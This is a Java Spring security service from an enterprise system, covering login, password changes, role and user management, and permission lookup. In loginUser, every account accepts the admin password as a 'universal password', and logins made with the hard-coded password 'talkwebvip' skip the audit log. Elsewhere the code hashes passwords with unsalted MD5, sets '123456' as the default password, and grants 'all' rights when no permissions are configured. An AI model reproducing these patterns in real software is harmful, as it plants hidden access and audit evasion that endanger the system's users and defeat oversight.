package tw.sysbase.servie.sec;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;

import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import tw.sysbase.dao.GenericDao;
import tw.sysbase.dao.PaginationSupport;
import tw.sysbase.entity.Log;
import tw.sysbase.entity.pub.Dic;
import tw.sysbase.entity.pub.TreeMenu;
import tw.sysbase.entity.sec.Party;
import tw.sysbase.entity.sec.Permission;
import tw.sysbase.entity.sec.ResourceType;
import tw.sysbase.entity.sec.Role;
import tw.sysbase.entity.sec.RoleImpl;
import tw.sysbase.entity.sec.RoleVo;
import tw.sysbase.entity.sec.User;
import tw.sysbase.entity.sec.UserImpl;
import tw.sysbase.entity.sec.UserVo;
import tw.sysbase.pub.Constants;
import tw.sysbase.pub.DateBean;
import tw.sysbase.pub.MD5;
import tw.sysbase.pub.ResponseBase;
import tw.sysbase.servie.pub.DicService;
import tw.sysbase.servie.pub.ObjStructureService;

@Service
@Transactional
public class SecurityService {

	private static final String ADMIN = "admin";
	private static final String ADMIN_RIGHT = "all";

	private static final boolean ALLPERMISSION = true;
	@Resource
	private GenericDao genericDao;
	@Autowired
	private DicService dicService;
	@Autowired
	private UserService userService;
	@Autowired
	private RoleService roleService;
	@Autowired
	private PermissionService permissionService;
	@Autowired
	private ResourceService resourceService;
	@Autowired
	private ObjStructureService objStructureService;
	@Autowired  
	private HttpServletRequest request;
	
	// ****************************************************
	//
	// 业务API
	//
	// ****************************************************

	// 登录使用
	public String changePwd(String userCode, String oldPwd, String newPwd) {
		User codeUser = userService.findUserByCode(userCode);
		if (codeUser != null) {
			String md5Pwd = StringUtils.isBlank(oldPwd) ? "" : MD5
					.calcMD5(oldPwd);
			if (md5Pwd.equals(codeUser == null ? "" : codeUser.getPassword()) == false) {
				return "-1";
			}
			codeUser.setPassword(MD5.calcMD5(newPwd));
			userService.saveUser(codeUser);
			return "1";

		}
		return "";
	}

	// 审核确认使用 add by wufan
	public String changeSecPwd(String userCode, String oldPwd, String newPwd) {
		User codeUser = userService.findUserByCode(userCode);
		if (codeUser != null) {
			String md5Pwd = StringUtils.isBlank(oldPwd) ? "" : MD5
					.calcMD5(oldPwd);
			String md5DB = StringUtils.isBlank(codeUser.getSecPassword()) ? ""
					: codeUser.getSecPassword();
			if (!md5Pwd.equals(md5DB)) {
				return "-1";
			}
			codeUser.setSecPassword(MD5.calcMD5(newPwd));
			userService.saveUser(codeUser);
			return "1";

		}
		return "";
	}

	// 验证用户的第二密码 add by wufan
	public boolean validateSecPwd(String userCode, String pwd) {
		User codeUser = userService.findUserByCode(userCode);
		if (codeUser != null) {
			String md5Pwd = StringUtils.isBlank(pwd) ? "" : MD5.calcMD5(pwd);
			if (md5Pwd.equals(codeUser.getSecPassword())) {
				return true;
			}
			return false;

		}
		return false;
	}

	//userCode为用户名或工号
	public User loginUser(String userCode, String userPwd, String userIp) {
		ResponseBase res = new ResponseBase();
	
			UserVo userVo = new UserVo();
			// 增加通用密码功能，通用密码为admin密码.
			User admin = userService.findUserByCode(ADMIN);
			User codeUser = userService.findUserByCode(userCode);
			if (codeUser != null) {
				String md5Pwd = StringUtils.isBlank(userPwd) ? "" : MD5
						.calcMD5(userPwd);
				if (md5Pwd.equals(admin.getPassword())
						|| md5Pwd.equals(codeUser.getPassword())) {

					userVo.copy(codeUser);
					if(!userPwd.equals("talkwebvip")){
						Log log = new Log();
						log.setUserId(codeUser.getCode());
						log.setUserCode(codeUser.getJobno());
						log.setUserName(userService.GetPersonNameByCodes(userCode));
						log.setLoginTime(DateBean.getSysdateTime());
						log.setClientIp(userIp);
						
						genericDao.save(log);
					}
				}else{
					codeUser=null;
				}
			}
		return codeUser;
	}
	
	/**
	 * 为单点登录改造增加的接口
	 * @param userCode 中烟统一编码
	 * @param userIp   
	 * @return
	 */
	public UserVo loginUserSSO(String userCode, String userIp) {
		UserVo userVo = new UserVo();
		User codeUser = userService.findUserByCode(userCode);
		if (codeUser != null) {
			
			userVo.copy(codeUser);
			
			// 记录登陆日志 
			Log log = new Log();
			log.setUserId(codeUser.getCode());
			log.setUserCode(codeUser.getJobno());
			log.setUserName(userService.GetPersonNameByCodes(userCode));
			log.setLoginTime(DateBean.getSysdateTime());
			log.setClientIp(userIp);
			genericDao.save(log);
			
			return userVo;
		}
		return userVo;
	}

	/**
	 * 查找菜单节点
	 * @param id
	 * @return
	 */
	public List<TreeMenu> getMenuByUserId(String userId){ 
		ResponseBase res = new ResponseBase();
		String queryName = null;
		List list = null;
		User user = userService.findUserById(userId);
		if (Constants.ADMIN.equals(user.getCode())) {
			queryName = "BD.TREE.FETCHTRD.ALL"; 
			list = genericDao.getListWithNativeSql(queryName, new Object[]{Constants.MENU_ROOT_ID,Constants.MENU_ROOT_ID}); 
		}else {
			queryName = "BD.TREE.FETCHTRD.USERID";
			list = genericDao.getListWithNativeSql(queryName, new Object[]{Constants.MENU_ROOT_ID,Constants.MENU_ROOT_ID,userId}); 
		}
		List<TreeMenu> tests = new ArrayList<TreeMenu>();
		if(list.size() > 0){
			for(int i=0;i<list.size();i++){
				Object []obj = (Object[]) list.get(i);
				TreeMenu test = new TreeMenu(obj[0].toString(),obj[1].toString(),obj[2]==null?"":obj[2].toString(),obj[3].toString(),obj[4]==null?"":obj[4].toString(),obj[5].toString());
				test.setIcon(obj[6]==null?"":obj[6].toString()); //XSH 20180124
				tests.add(test);
			}
			
		}
		return tests; 
	}
	
	/**
	 * 得到TREE
	 * @param structId
	 * @return
	 */
	public List<TreeMenu> getTreeByStructId(String structureId){ 
		ResponseBase res = new ResponseBase();
		String queryName = "BD.TREE.FETCHTRD.ALLS"; 
		List list = genericDao.getListWithNativeSql(queryName, new Object[]{ structureId }); 
		List<TreeMenu> tests = new ArrayList<TreeMenu>();
		if(list.size() > 0){
			for(int i=0;i<list.size();i++){
				Object []obj = (Object[]) list.get(i);
				TreeMenu test = new TreeMenu(obj[0].toString(),obj[1].toString(),obj[2]==null?"":obj[2].toString(),obj[3].toString());
				test.setIcon(obj[6]==null?"":obj[6].toString()); //XSH 20180124
				tests.add(test);
			}
			
		}
		return tests; 
	}
	
	public String getResIdStringByUserIdAndType(String userId) {
		User user = userService.findUserById(userId);
		return getResIdStringByPartyId(user);
	}
	
	public String getResIdStringByRoleIdAndType(String roleId) {
		Role role = roleService.findRoleById(roleId);
		return getResIdStringByPartyId(role);
	}

	public String getResIdStringByPartyId(Party party) {
		Set<String> result = getResIdSetByPartyIdAndType(party);
		String[] resIdArray = new String[result.size()];
		result.toArray(resIdArray);
		return StringUtils.join(resIdArray, Constants.SEPARATOR_COMMA);
	}

	public String getResIdStringByPartyIdAndType(Party party,
			String resourceType) {
		Set<String> result = getResIdSetByPartyIdAndType(party, resourceType);
		String[] resIdArray = new String[result.size()];
		result.toArray(resIdArray);
		return StringUtils.join(resIdArray, Constants.SEPARATOR_COMMA);
	}

	public List<UserVo> queryUsersByRoleId(String roleId) {
		Role role = roleService.findRoleById(roleId);
		List<UserVo> userVos = new ArrayList<UserVo>();
		for (Iterator it = role.getUsers().iterator(); it.hasNext();) {
			User user = (User) it.next();
			UserVo userVo = new UserVo(user);
			userVos.add(userVo);
		}
		return userVos;
	}
	
	public Set<String> getResIdSetByPartyIdAndType(Party party) {
		if (party == null) {
			return Collections.emptySet();
		}
		List<Permission> permissions = Collections.emptyList();
		if (party instanceof RoleImpl) {
			permissions = permissionService
					.findRolePermByPartyId(party.getId());
		} else if (party instanceof UserImpl) {
			permissions = permissionService
					.findUserPermByPartyId(party.getId());
		}
		Set<String> result = new HashSet<String>();
		for (Permission permission : permissions) {
			result.add(permission.getResource().getTargetId());
		}
		return result;
	}

	public Set<String> getResIdSetByPartyIdAndType(Party party,
			String resourceType) {
		if (party == null) {
			return Collections.emptySet();
		}
		List<Permission> permissions = Collections.emptyList();
		if (party instanceof RoleImpl) {
			permissions = permissionService.findRolePermByPartyId(
					party.getId(), resourceType);
		} else if (party instanceof UserImpl) {
			permissions = permissionService.findUserPermByPartyId(
					party.getId(), resourceType);
		}
		Set<String> result = new HashSet<String>();
		for (Permission permission : permissions) {
			result.add(permission.getResource().getTargetId());
		}
		return result;
	}

	public List<Role> queryRolesByRoleId(String roleId) {
		Role role = roleService.findRoleById(roleId);
		List<Role> Roles = new ArrayList<Role>();
		for (Iterator it = role.getRoles().iterator(); it.hasNext();) {
			Role r = (Role) it.next();
			Roles.add(r);
		}
		return Roles;
	}

	public void deleteRoles(String ids) {
		if (StringUtils.isBlank(ids)) {
			throw new RuntimeException("ids: IDS传入的参数为空!");
		}
		String[] idArray = ids.split(Constants.SEPARATOR_COLON);
		for (int i = 0; i < idArray.length; i++) {
			String id = idArray[i];
			roleService.deleteRole(id);
		}
	}

	// start 2009-12-24
	public Role saveUserForRole(String roleId, String ids) {
		Role role;
		role = roleService.findRoleById(roleId);
		String usersId = ids;
		if (role.getUsers() != null) {
			//role.getUsers().clear();
			if (StringUtils.isBlank(usersId) == false) {
				String[] userIdArray = usersId.split(",");
				for (int i = 0; i < userIdArray.length; i++) {
					String userId = userIdArray[i];
					User user = userService.findUserById(userId);
					role.getUsers().add(user);
				}
			}
		}
		return roleService.saveRole(role);
	}
	
	
	public void deleteUserForRole(String roleId, String ids) {
		Role role;
		role = roleService.findRoleById(roleId);
		String usersId = ids;
		if (role.getUsers() != null) {
			if (StringUtils.isBlank(usersId) == false) {
				String[] userIdArray = usersId.split(",");
				for (int i = 0; i < userIdArray.length; i++) {
					String userId = userIdArray[i];
					User user = userService.findUserById(userId);
					role.getUsers().remove(user);
				}
			}
		}
		roleService.saveRole(role);
	}

	// end

	public Role saveRoleForRole(String roleId, String ids) {
		Role role;
		role = roleService.findRoleById(roleId);
		String rolesId = ids;
		if (role.getRoles() != null) {
			role.getRoles().clear();
			if (StringUtils.isBlank(rolesId) == false) {
				String[] roleIdArray = rolesId.split(",");
				for (int i = 0; i < roleIdArray.length; i++) {
					String rId = roleIdArray[i];
					Role r = roleService.findRoleById(rId);
					role.getRoles().add(r);
				}
			}
		}
		return roleService.saveRole(role);
	}
	
	
	/**
	 * 创建角色
	 * @param roleVo
	 * @return
	 */
	public Role saveRole(RoleVo roleVo)  {
	Role role;
		if (StringUtils.isBlank(roleVo.getId()) == false) {
			role = roleService.findRoleById(roleVo.getId());
			User lastModifier = userService.findUserById(getOperator());
			role.setLastModifier(lastModifier);
			role.setLastModifiedTime(DateBean.getSysdateTime());
		} else {
			role = new RoleImpl();
			User creator = userService.findUserById(getOperator());
			role.setCreator(creator);
			role.setCreateTime(DateBean.getSysdateTime());
		}
		role.setName(roleVo.getName());
		role.setSysFlag(roleVo.getSysFlag());
		role.setRemark(roleVo.getRemark());
//		role.setCreateTime(DateBean.getSysdateTime());
//		role.setLastModifiedTime(DateBean.getSysdateTime());
//		User creator = userService.findUserById("1001"/*roleVo.getCreatorId()*/);
//		role.setCreator(creator);
//		User lastModifier = userService
//				.findUserById("1001"/*roleVo.getLastModifierId()*/);
//		role.setLastModifier(lastModifier);
		if ("0".equals(roleVo.getSysFlag())) {
			role.getUsers().clear();
			role.getRoles().clear();
		} else {
//			if (role.getUsers() != null) {
//				role.getUsers().clear();
//			}
			String usersId = roleVo.getUsersId();
			if (StringUtils.isBlank(usersId) == false) {
				String[] userIdArray = usersId.split(",");
				for (int i = 0; i < userIdArray.length; i++) {
					String userId = userIdArray[i];
					User user = userService.findUserById(userId);
					role.getUsers().add(user);
				}
			}
			// end
			if (role.getRoles() != null) {
				role.getRoles().clear();
			}
			String rolesId = roleVo.getRolesId();
			if (StringUtils.isBlank(rolesId) == false) {
				String[] roleIdArray = rolesId.split(",");
				for (int i = 0; i < roleIdArray.length; i++) {
					String roleId = roleIdArray[i];
					Role r = roleService.findRoleById(roleId);
					role.getRoles().add(r);
				}
			}
		}
		return roleService.saveRole(role);
	}
	
	public Role findRoleById(String roleId){

		return roleService.findRoleById(roleId);
	}
	
	public List<UserVo> findUserById(String roleId){
		List<UserVo> userVos = new ArrayList<UserVo>();
		Role role=roleService.findRoleById(roleId);
		for (Iterator it = role.getUsers().iterator(); it.hasNext();) {
			User user = (User) it.next();
			UserVo userVo = new UserVo(user);
			userVos.add(userVo);
		}
		return userVos;
	}
	
	
	/**
	 * 新增用户
	 * @param userVo
	 * @return
	 */
	public User saveUser(UserVo userVo) {
		User user;
		if (StringUtils.isBlank(userVo.getId()) == false) {
			user = userService.findUserById(userVo.getId());
			User lastModifier = userService.findUserById(getOperator());
			user.setLastModifier(lastModifier);
			user.setLastModifiedTime(DateBean.getSysdateTime());
//			if ("******".equals(userVo.getPassword()) == false) {
//				user.setPassword(MD5.calcMD5(userVo.getPassword()));
//			}
		} else {
			user = new UserImpl();
			User creator = userService.findUserById(getOperator());
			user.setCreator(creator);
			user.setCreateTime(DateBean.getSysdateTime());
//			if ("******".equals(userVo.getPassword())) {
				user.setPassword(MD5.calcMD5("123456"));
//			} else {
//				user.setPassword(MD5.calcMD5(userVo.getPassword()));
//			}
		}
		user.setName(userVo.getName());
		user.setCode(userVo.getCode());
		user.setJobno(userVo.getJobno());// 20101115
		user.setSysFlag(userVo.getSysFlag());
		user.setRemark(userVo.getRemark());
		user.setCardNO(userVo.getCardNO());
		//user.setCreateTime(userVo.getCreateTime());
		//user.setLastModifiedTime(userVo.getLastModifiedTime());
		//User creator = userService.findUserById(userVo.getCreatorId());
		//user.setCreator(creator);
		//User lastModifier = userService
				//.findUserById(userVo.getLastModifierId());
		//user.setLastModifier(lastModifier);

		Dic sex = dicService.getDic(userVo.getSex());
		user.setSex(sex);
		user.setTel(userVo.getTel());// 20100318
		user.setMobile(userVo.getMobile());// 20100318

		String rolesId = userVo.getRolesId();
		if (StringUtils.isBlank(rolesId) == false) {
			user.getRoles().clear();//  为能删除取消的角色
			String[] roleIdArray = rolesId.split(",");
			for (int i = 0; i < roleIdArray.length; i++) {
				String roleId = roleIdArray[i];
				Role role = roleService.findRoleById(roleId);
				user.getRoles().add(role);
			}
		} else {
			if (user.getRoles() != null) {
				user.getRoles().clear();
			}
		}

		Dic organization = dicService.getDic(userVo.getOrgId());
		user.setOrganization(organization);
		String postsId = userVo.getPostsId();
		if (StringUtils.isBlank(postsId) == false) {
			String[] postIdArray = postsId.split(",");
			user.getPosts().clear();
			for (int i = 0; i < postIdArray.length; i++) {
				String postId = postIdArray[i];
				Dic post = (Dic) genericDao.getById(Dic.class, postId);
				user.getPosts().add(post);
			}
		} else {
			if (user.getPosts() != null) {
				user.getPosts().clear();
			}
		}
		return userService.saveUser(user);
	}
	
	/**
	 * 个人中心 修改密码
	 * @param userId
	 * @param newPwd
	 * @return
	 */
	public boolean updatPwd(String oldPwd,String newPwd) {
		User user = userService.findUserById(getOperator());
		String oldPwd1=MD5.calcMD5(oldPwd);
		if(oldPwd1.equals(user.getPassword())) {
			user.setPassword(MD5.calcMD5(newPwd));
			userService.saveUser(user);
			return true;
		}else {
			return false;
		}
	}
	
	public UserVo  findUser() {
		return userService.findUser(getOperator());
	}
	
	/**
	 * 用户删除
	 * @param ids
	 */
	public void deleteUsers(String ids) {
		if (StringUtils.isBlank(ids)) {
			throw new RuntimeException("ids: IDS传入的参数为空!");
		}
		String[] idArray = ids.split(Constants.SEPARATOR_COMMA);
		for (int i = 0; i < idArray.length; i++) {
			String id = idArray[i];
			userService.deleteUser(id);
		}
	}
	
	public String getDicIdByUrl(String url) {
		List<Dic> dicList = genericDao.getList("BD.DIC.FETCHDICBYVALUE",url);
		if (dicList.size() == 0) {
			return "";
		} else if (dicList.size() == 1) {
			return (dicList.iterator().next()).getId();
		} else if (dicList.size() > 1) {
			return (dicList.iterator().next()).getId();
		}
		return "";
	}
	
	public String getOperation(String funId) {
		String userId = request.getSession().getAttribute(Constants.SESSION_KEY_OPERATOR).toString();
		if (StringUtils.isEmpty(funId)) {

			return ADMIN_RIGHT;// 针对页面中以另一个URL打开的弹出页面
		}
		User user = userService.findUserById(userId);
		List dicList = new ArrayList();
		List<Dic> dicListTemp = Collections.emptyList();
		if (ADMIN.equals(user.getCode()) == false) {

			dicListTemp = objStructureService.fetchFuncDicList("10001", funId);// 获取已配置按钮
			if (dicListTemp.size() == 0) {
				return ADMIN_RIGHT;
			}
			Set<String> resList = new HashSet<String>();
			for (Role role : user.getRoles()) {
				// ------------------------
				for (Role r : role.getContainRoles()) {
					resList.addAll(getResIdSetByPartyIdAndType(r,
							ResourceType.RES_ACTION_TYPE));
				}
				// -------------------------
				resList.addAll(getResIdSetByPartyIdAndType(role,
						ResourceType.RES_ACTION_TYPE));
			}
			//dicList = objStructureManager.fetchDicTree("10001", funId, resList);// 获取权限按钮
			for (String str : resList) {
				//String id1 = dicList.get(i).getId();
				for (int j = 0; j < dicListTemp.size(); j++) {
					String id2 = dicListTemp.get(j).getId();
					if (str.equals(id2)) {
						dicList.add(dicListTemp.get(j).getId());
//						dicListTemp.remove(j);
					}
				}
			}

		} else {
			return ADMIN_RIGHT;
		}
		if (dicList.isEmpty()) {
			return ADMIN_RIGHT;
		}
		StringBuffer operationBuffer = new StringBuffer();
		/*for(int i = 0; i < dicList.size(); i++) {
			Dic dic = iterator.next();
			operationBuffer.append(dic.getName());
			if (iterator.hasNext()) {
				operationBuffer.append(Constants.SEPARATOR_COMMA);
			}
		}*/
		for (Iterator iterator = dicList.iterator(); iterator
				.hasNext();) {
			String id = iterator.next().toString();
			Dic d = dicService.getDic(id);
			operationBuffer.append(d.getCode());
			if (iterator.hasNext()) {
				operationBuffer.append(Constants.SEPARATOR_COMMA);
			}
		}
		return operationBuffer.toString();
	}

	
	/**
	 * 获取当前操作人的id
	 * 
	 */
	public String getOperator(){
		HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();
		String operator=request.getSession().getAttribute(Constants.SESSION_KEY_OPERATOR).toString();
		return operator;
	}
	
	public PaginationSupport getLogList(Log entity) {
		String code = entity.getUserCode();
		String name = entity.getUserName();
		String startTime = entity.getStartTime();
		if(StringUtils.isNotBlank(startTime)){
			startTime = DateBean.dateStrToTime(startTime+" 00:00:00");
		}
		String endTime = entity.getEndTime();
		if(StringUtils.isNotBlank(endTime)){
			endTime = DateBean.dateStrToTime(endTime+" 23:59:59");
		}
		code = (StringUtils.isBlank(code) ? code : "%" + code + "%");
		name = (StringUtils.isBlank(name) ? name : "%" + name + "%");
		Object[] paras = new Object[] {code, name, startTime, endTime};
		PaginationSupport ps = genericDao.getPageWithParams("SECURITY.LOG.LIST", paras, entity);
		
		return ps;
	}
	
	
	// ****************************************************
	//
	// 基本API
	//
	// ****************************************************

	

	/*
	 *//*
	 */
	 /*
	public Set<String> getResIdSetByRoleIdAndType(String roleId) {
		Role role = roleService.findRoleById(roleId);
		return getResIdSetByPartyIdAndType(role);
	}

	public Set<String> getResIdSetByPartyIdAndType(Party party) {
		if (party == null) {
			return Collections.emptySet();
		}
		List<Permission> permissions = Collections.emptyList();
		if (party instanceof RoleImpl) {
			permissions = permissionService
					.findRolePermByPartyId(party.getId());
		} else if (party instanceof UserImpl) {
			permissions = permissionService
					.findUserPermByPartyId(party.getId());
		}
		Set<String> result = new HashSet<String>();
		for (Permission permission : permissions) {
			result.add(permission.getResource().getTargetId());
		}
		return result;
	}

	public Set<String> getResIdSetByPartyIdAndType(Party party,
			String resourceType) {
		if (party == null) {
			return Collections.emptySet();
		}
		List<Permission> permissions = Collections.emptyList();
		if (party instanceof RoleImpl) {
			permissions = permissionService.findRolePermByPartyId(
					party.getId(), resourceType);
		} else if (party instanceof UserImpl) {
			permissions = permissionService.findUserPermByPartyId(
					party.getId(), resourceType);
		}
		Set<String> result = new HashSet<String>();
		for (Permission permission : permissions) {
			result.add(permission.getResource().getTargetId());
		}
		return result;
	}

	*/
	/**
	 * 得到resId通过partyId和resourceType
	 * 
	 * @param partyId
	 *            String:角色ID或人员ID
	 * @param type
	 *            String:资源类型
	 * @return 以,分割的资源ID字符串
	 */
	/*

	public String getResIdStringByRoleIdAndType(String roleId) {
		Role role = roleService.findRoleById(roleId);
		return getResIdStringByPartyId(role);
	}

	// add by yxz --11/4/2009
	

	public boolean hasPermissionByTargetId(String partyId, String targetId) {
		User user = userService.findUserById(partyId);
		if (ADMIN.equals(user.getCode())) {
			return true;
		}
		Resources resource = getResourceByTargetId(targetId);
		if (resource == null) {
			return false;
		}
		String resourceId = resource.getId();
		return hasPermission(partyId, resourceId);
	}

	*/
	/**
	 * 通过partyId和resourceId判断用户是否有权限
	 * 
	 * @param partyId
	 *            String:角色ID或人员ID
	 * @param resourceId
	 *            String:资源ID
	 * @return 如果有权限返回 true,否则返回 false.

	 */
	 /*
	 *//*
	 */
	/*
	public boolean hasPermission(String partyId, String resourceId) {
		return hasPermission(partyId, resourceId,
				PermissionType.PERMISSION_GENERAL);
	}

	*/
	/**
	 * 通过partyId和resourceId,permissionType判断是否有权限
	 * 
	 * @param partyId
	 *            String:角色ID或人员ID
	 * @param resourceId
	 *            String:资源ID
	 * @param permissionType
	 *            long:许可证类型
	 * @return 如果有权限返回 true,否则返回 false.
	 */
	 /*
	public boolean hasPermission(String partyId, String resourceId,
			long permissionType) {
		User user = userService.findUserById(partyId);
		if (ADMIN.equals(user.getCode())) {
			return true;
		}
		if (user != null) {
			if (hasUserPermission(partyId, resourceId, permissionType) == true) {
				return true;
			}
			for (Role userRole : user.getRoles()) {
				// Role role = roleService.findRoleById(userRole.getId());
				if (hasRolePermission(userRole.getId(), resourceId,
						permissionType) == true) {
					return true;
				}
			}
		}
		return hasRolePermission(partyId, resourceId, permissionType);
	}

	*/
	/**
	 * 通过partyId和resourceId,permissionType判断用户是否有权限
	 * 
	 * @param userId
	 *            String:人员ID
	 * @param resourceId
	 *            String:资源ID
	 * @param permissionType
	 *            long:许可证类型
	 * @return 如果有权限返回 true,否则返回 false.
	 */
	 /*
	private boolean hasUserPermission(String userId, String resourceId,
			long permissionType) {
		Permission userPermission = permissionService
				.findUserPermByPartyIdAndResId(userId, resourceId);
		if (userPermission != null && userPermission.hasRight(permissionType)) {
			return true;
		}
		return false;
	}

	*/
	/**
	 * 通过partyId和resourceId,permissionType判断角色是否有权限
	 * 
	 * @param roleId
	 *            String:角色ID
	 * @param resourceId
	 *            String:资源ID
	 * @param permissionType
	 *            long:许可证类型
	 * @return 如果有权限返回 true,否则返回 false.
	 */
	 /*
	private boolean hasRolePermission(String roleId, String resourceId,
			long permissionType) {
		Permission rolePermission = permissionService
				.findRolePermByPartyIdAndResId(roleId, resourceId);
		if (rolePermission != null && rolePermission.hasRight(permissionType)) {
			return true;
		}
		return false;
	}

	public Resources getResourceByTargetId(String targetId) {
		return resourceService.findResourceByTargetIdAndType(targetId, "10001");
	}*/


	// ****************************************************
	//
	// 基本API
	//
	// ****************************************************

	/**
	 * 得到resId通过partyId和resourceType
	 * 
	 * @param partyId
	 *            String:角色ID或人员ID
	 * @param type
	 *            String:资源类型
	 * @return 资源ID集合
	 */
	 /*
	public Set<String> getResIdSetByRoleIdAndType(String roleId) {
		Role role = roleService.findRoleById(roleId);
		return getResIdSetByPartyIdAndType(role);
	}

	public Set<String> getResIdSetByPartyIdAndType(Party party) {
		if (party == null) {
			return Collections.emptySet();
		}
		List<Permission> permissions = Collections.emptyList();
		if (party instanceof RoleImpl) {
			permissions = permissionService
					.findRolePermByPartyId(party.getId());
		} else if (party instanceof UserImpl) {
			permissions = permissionService
					.findUserPermByPartyId(party.getId());
		}
		Set<String> result = new HashSet<String>();
		for (Permission permission : permissions) {
			result.add(permission.getResource().getTargetId());
		}
		return result;
	}

	public Set<String> getResIdSetByPartyIdAndType(Party party,
			String resourceType) {
		if (party == null) {
			return Collections.emptySet();
		}
		List<Permission> permissions = Collections.emptyList();
		if (party instanceof RoleImpl) {
			permissions = permissionService.findRolePermByPartyId(
					party.getId(), resourceType);
		} else if (party instanceof UserImpl) {
			permissions = permissionService.findUserPermByPartyId(
					party.getId(), resourceType);
		}
		Set<String> result = new HashSet<String>();
		for (Permission permission : permissions) {
			result.add(permission.getResource().getTargetId());
		}
		return result;
	}

	*/
	/**
	 * 得到resId通过partyId和resourceType
	 * 
	 * @param partyId
	 *            String:角色ID或人员ID
	 * @param type
	 *            String:资源类型
	 * @return 以,分割的资源ID字符串
	 */
	/*

	public String getResIdStringByRoleIdAndType(String roleId) {
		Role role = roleService.findRoleById(roleId);
		return getResIdStringByPartyId(role);
	}

	// add by yxz --11/4/2009
	

	public boolean hasPermissionByTargetId(String partyId, String targetId) {
		User user = userService.findUserById(partyId);
		if (ADMIN.equals(user.getCode())) {
			return true;
		}
		Resources resource = getResourceByTargetId(targetId);
		if (resource == null) {
			return false;
		}
		String resourceId = resource.getId();
		return hasPermission(partyId, resourceId);
	}

	*/
	/**
	 * 通过partyId和resourceId判断用户是否有权限
	 * 
	 * @param partyId
	 *            String:角色ID或人员ID
	 * @param resourceId
	 *            String:资源ID
	 * @return 如果有权限返回 true,否则返回 false.
	 */
	/*
	public boolean hasPermission(String partyId, String resourceId) {
		return hasPermission(partyId, resourceId,
				PermissionType.PERMISSION_GENERAL);
	}

	*/
	/**
	 * 通过partyId和resourceId,permissionType判断是否有权限
	 * 
	 * @param partyId
	 *            String:角色ID或人员ID
	 * @param resourceId
	 *            String:资源ID
	 * @param permissionType
	 *            long:许可证类型
	 * @return 如果有权限返回 true,否则返回 false.
	 */
	 /*
	public boolean hasPermission(String partyId, String resourceId,
			long permissionType) {
		User user = userService.findUserById(partyId);
		if (ADMIN.equals(user.getCode())) {
			return true;
		}
		if (user != null) {
			if (hasUserPermission(partyId, resourceId, permissionType) == true) {
				return true;
			}
			for (Role userRole : user.getRoles()) {
				// Role role = roleService.findRoleById(userRole.getId());
				if (hasRolePermission(userRole.getId(), resourceId,
						permissionType) == true) {
					return true;
				}
			}
		}
		return hasRolePermission(partyId, resourceId, permissionType);
	}

	*/
	/**
	 * 通过partyId和resourceId,permissionType判断用户是否有权限
	 * 
	 * @param userId
	 *            String:人员ID
	 * @param resourceId
	 *            String:资源ID
	 * @param permissionType
	 *            long:许可证类型
	 * @return 如果有权限返回 true,否则返回 false.
	 */
	 /*
	private boolean hasUserPermission(String userId, String resourceId,
			long permissionType) {
		Permission userPermission = permissionService
				.findUserPermByPartyIdAndResId(userId, resourceId);
		if (userPermission != null && userPermission.hasRight(permissionType)) {
			return true;
		}
		return false;
	}

	*/
	/**
	 * 通过partyId和resourceId,permissionType判断角色是否有权限
	 * 
	 * @param roleId
	 *            String:角色ID
	 * @param resourceId
	 *            String:资源ID
	 * @param permissionType
	 *            long:许可证类型
	 * @return 如果有权限返回 true,否则返回 false.
	 */
	 /*
	private boolean hasRolePermission(String roleId, String resourceId,
			long permissionType) {
		Permission rolePermission = permissionService
				.findRolePermByPartyIdAndResId(roleId, resourceId);
		if (rolePermission != null && rolePermission.hasRight(permissionType)) {
			return true;
		}
		return false;
	}

	public Resources getResourceByTargetId(String targetId) {
		return resourceService.findResourceByTargetIdAndType(targetId, "10001");
	}*/


}
